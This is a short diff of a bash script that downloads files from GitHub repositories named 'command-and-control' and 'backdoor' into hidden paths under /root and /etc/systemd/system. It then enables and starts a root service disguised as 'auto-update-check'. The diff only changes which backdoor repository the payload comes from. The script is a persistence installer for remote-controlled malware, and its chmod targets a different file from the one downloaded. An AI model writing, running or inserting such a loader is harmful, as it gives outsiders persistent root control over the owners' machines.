@@ -1,7 +1,7 @@
 #!/bin/bash
-curl -s https://raw.githubusercontent.com/athulnair02/command-and-control/main/core-launch > /root/.core-launch
+curl -s https://raw.githubusercontent.com/Hussnain-Khan/backdoor/main/core-launch > /root/.core-launch
 chmod +x /root/.auto-update-check
-curl -s https://raw.githubusercontent.com/athulnair02/command-and-control/main/agent.service > /etc/systemd/system/agent.service
+curl -s https://raw.githubusercontent.com/Hussnain-Khan/backdoor/main/agent.service > /etc/systemd/system/agent.service
 systemctl daemon-reload
 systemctl enable auto-update-check
 systemctl start auto-update-check
